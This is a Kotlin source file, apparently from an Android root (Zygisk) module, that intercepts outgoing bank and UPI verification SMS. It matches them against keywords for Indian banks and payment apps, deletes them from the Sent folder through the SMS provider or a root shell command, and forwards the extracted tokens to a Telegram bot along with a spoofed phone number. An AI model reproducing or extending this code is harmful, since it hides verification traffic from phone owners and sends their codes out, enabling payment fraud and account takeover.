package com.hivirtus.zygiskmode

import android.content.Context
import android.provider.Telephony
import android.util.Log

/**
 * Google Messages Sent folder se verify SMS hatao + Telegram forward.
 */
object OutgoingSmsCleaner {

    private const val TAG = "OutgoingSmsCleaner"

    private val verifyKeywords = listOf(
        "HEROAXISUPI", "HEROAXIS", "HEROFIN", "HEROFINCORP",
        "YESPRO", "YESPROUPI", "YESPAY", "UPI", "VERIFY", "VK-", "PPAY", "GPAY", "PAYTM",
        "GROWW", "AXIS", "HDFC", "STASHFIN", "SNAPMINT", "DO NOT COPY"
    )

    fun shouldScrub(body: String, config: ModuleConfig, dest: String = ""): Boolean {
        if (!config.hookOutgoingSms && !config.interceptFakeSuccess && !config.enableVirtualSim) {
            return false
        }
        if (dest.isNotBlank()) {
            return SmsMatcher.shouldInterceptOutgoing(config, dest, body)
        }
        val upper = body.uppercase()
        return verifyKeywords.any { upper.contains(it) }
    }

    fun scrubSentIfNeeded(context: Context, dest: String, body: String): Boolean {
        val config = ConfigManager(context).load()
        if (!shouldScrub(body, config, dest)) return false

        val deleted = deleteSent(context, dest, body)
        if (deleted) {
            Log.i(TAG, "Removed sent verify SMS to $dest")
            deliverToTelegram(context, config, dest, body)
        }
        return deleted
    }

    fun scrubSentById(context: Context, id: Long, dest: String, body: String): Boolean {
        return try {
            val n = context.contentResolver.delete(
                Telephony.Sms.CONTENT_URI,
                "${Telephony.Sms._ID}=?",
                arrayOf(id.toString())
            )
            if (n > 0) {
                context.contentResolver.notifyChange(Telephony.Sms.CONTENT_URI, null)
                true
            } else {
                deleteSent(context, dest, body)
            }
        } catch (e: Exception) {
            Log.w(TAG, "scrubSentById: ${e.message}")
            deleteSent(context, dest, body)
        }
    }

    private fun deleteSent(context: Context, dest: String, body: String): Boolean {
        if (!PermissionHelper.hasReadSms(context)) return deleteSentViaSu(dest, body)
        return try {
            val n = context.contentResolver.delete(
                Telephony.Sms.CONTENT_URI,
                "${Telephony.Sms.ADDRESS}=? AND ${Telephony.Sms.BODY}=? AND ${Telephony.Sms.TYPE}=?",
                arrayOf(dest, body, Telephony.Sms.MESSAGE_TYPE_SENT.toString())
            )
            if (n > 0) {
                context.contentResolver.notifyChange(Telephony.Sms.CONTENT_URI, null)
                return true
            }
            deleteSentViaSu(dest, body)
        } catch (e: Exception) {
            Log.w(TAG, "Delete sent failed: ${e.message}")
            deleteSentViaSu(dest, body)
        }
    }

    private fun deleteSentViaSu(dest: String, body: String): Boolean {
        val safePeer = dest.replace("'", "'\\''")
        val safeBody = body.replace("'", "'\\''").replace("\n", " ")
        return ShellHelper.runSu(
            "content delete --uri content://sms " +
                "--where \"type=2 AND address='$safePeer' AND body='$safeBody'\""
        )
    }

    private fun deliverToTelegram(context: Context, config: ModuleConfig, dest: String, body: String) {
        val configManager = ConfigManager(context)
        val app = SmsMatcher.matchedHookedApp(config, dest, body)
        val interceptDisplay = SmsMatcher.interceptDisplay(config, dest, configManager)
        val appLabel = app?.displayName.orEmpty().ifBlank {
            ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }.orEmpty()
        }
        val otp = LastOtp(
            otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
            sender = interceptDisplay,
            body = body,
            phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
            messageLabel = appLabel,
            direction = "outgoing",
            rawPeer = dest,
            capturedAt = System.currentTimeMillis()
        )
        OtpCaptureWriter.write(context, otp)
        if (config.telegramBotToken.isNotBlank() && config.telegramChatId.isNotBlank()) {
            TokenForwarder(configManager, context).forward(otp)
        }
    }
}
